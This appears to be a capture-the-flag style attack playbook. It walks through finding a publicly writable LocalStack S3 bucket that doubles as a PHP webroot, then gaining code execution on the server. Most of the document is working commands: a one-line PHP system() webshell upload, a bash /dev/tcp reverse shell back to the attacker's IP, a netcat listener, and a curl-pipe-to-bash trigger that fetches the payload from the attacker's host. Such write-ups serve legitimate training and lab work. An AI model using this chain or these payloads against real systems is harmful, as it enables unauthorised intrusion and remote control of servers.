
**Category:** Attack Techniques / Cloud / Linux  
**Key Concepts:** S3 bucket enumeration, misconfigured permissions, PHP webshell upload, reverse shell  
**Services:** HTTP (80), SSH (22), LocalStack S3

---

## When To Use This Chain

- Web app hosted on Linux with S3 bucket as storage backend
- S3 subdomain discovered during vhost enumeration
- Bucket has public write permissions (no auth required)
- Server runs PHP

---

## Recon Signals

```bash
nmap -sV TARGET
```

Look for:
- Port 80 HTTP — web app
- Port 22 SSH
- Check page source for email domain — reveals virtual host name
- `/index.php` loads — confirms PHP backend

---

## Virtual Host and Subdomain Discovery

```bash
# Add main domain to /etc/hosts
echo "TARGET_IP domain.htb" | sudo tee -a /etc/hosts

# Enumerate subdomains via vhost
gobuster vhost -u http://domain.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 50

# Add discovered subdomain to /etc/hosts
echo "TARGET_IP s3.domain.htb" | sudo tee -a /etc/hosts
```

---

## S3 Bucket Identification

**Signal:** Subdomain named `s3` returning JSON with `"status": "running"` or health endpoint showing `"s3": "running"`

**Confirm with:**
```bash
curl -s http://s3.TARGET.htb/health
# Look for: "s3": "running"

curl -I http://s3.TARGET.htb
# Look for: x-localstack-target header = LocalStack confirmed
```

---

## Interacting with S3 Using AWS CLI

```bash
# Install if needed
sudo apt install awscli -y

# Configure with dummy credentials (misconfigured buckets don't check auth)
aws configure
# Enter anything for all fields — region: us-east-1 works

# List all buckets
aws --endpoint=http://s3.TARGET.htb s3 ls

# List contents of specific bucket
aws --endpoint=http://s3.TARGET.htb s3 ls s3://TARGET.htb
```

**If bucket contains `index.php`** — the S3 bucket IS the webroot. Files uploaded here are served by the web server directly.

---

## PHP Webshell Upload

```bash
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to S3 bucket
aws --endpoint=http://s3.TARGET.htb s3 cp shell.php s3://TARGET.htb

# Verify upload
aws --endpoint=http://s3.TARGET.htb s3 ls s3://TARGET.htb

# Test code execution
curl "http://TARGET.htb/shell.php?cmd=id"
# Should return: uid=33(www-data) gid=33(www-data)
```

---

## Reverse Shell via Webshell

**Step 1 — Create reverse shell script:**
```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_KALI_IP/1337 0>&1
EOF
```

**Step 2 — Host it on a local web server:**
```bash
# Run from same directory as shell.sh
python3 -m http.server 8000
```

**Step 3 — Start netcat listener:**
```bash
nc -nvlp 1337
```

**Step 4 — Trigger the reverse shell via webshell:**
```
http://TARGET.htb/shell.php?cmd=curl%20YOUR_KALI_IP:8000/shell.sh|bash
```

This tells the server to download your shell script and execute it, which connects back to your listener.

---

## AWS CLI Quick Reference

```bash
# List buckets
aws --endpoint=http://s3.TARGET s3 ls

# List bucket contents
aws --endpoint=http://s3.TARGET s3 ls s3://BUCKET_NAME

# Upload file
aws --endpoint=http://s3.TARGET s3 cp FILE s3://BUCKET_NAME

# Download file
aws --endpoint=http://s3.TARGET s3 cp s3://BUCKET_NAME/FILE ./FILE

# Delete file
aws --endpoint=http://s3.TARGET s3 rm s3://BUCKET_NAME/FILE

# Sync entire directory
aws --endpoint=http://s3.TARGET s3 sync . s3://BUCKET_NAME
```

---

## Full Attack Chain Summary

```
1. nmap            → find port 80 (PHP) + port 22
2. Browse site     → find email domain in source/contact section
3. /etc/hosts      → add domain.htb
4. gobuster vhost  → find s3.domain.htb
5. /etc/hosts      → add s3.domain.htb
6. curl health     → confirm S3 running (LocalStack)
7. aws s3 ls       → list buckets
8. aws s3 ls s3:// → find index.php = bucket is webroot
9. Upload shell.php → aws s3 cp shell.php s3://domain.htb
10. Test RCE       → /shell.php?cmd=id
11. Host shell.sh  → python3 -m http.server 8000
12. nc listener    → nc -nvlp 1337
13. Trigger shell  → /shell.php?cmd=curl IP:8000/shell.sh|bash
14. Get flag       → cat /var/www/flag.txt
```

---

## Key Concepts

**S3 bucket as webroot** — when a web server uses S3 for storage and the bucket has public write access, uploading a PHP file to the bucket puts it directly in the webroot. Visiting that URL executes it.

**LocalStack** — open source tool that emulates AWS services locally. Version visible in `/health` endpoint. Commonly misconfigured with no authentication.

**PHP `system()` webshell** — minimal one-liner that executes OS commands via URL parameter. Not stealthy but effective for initial access in lab environments.

**Curl pipe to bash** — `curl URL | bash` downloads and immediately executes a script. Common pattern for delivering reverse shells when you have command execution but limited shell functionality.

**Real world relevance** — misconfigured S3 buckets are one of the most common cloud security findings. Companies regularly expose sensitive data or enable public write access accidentally. This attack chain is realistic.
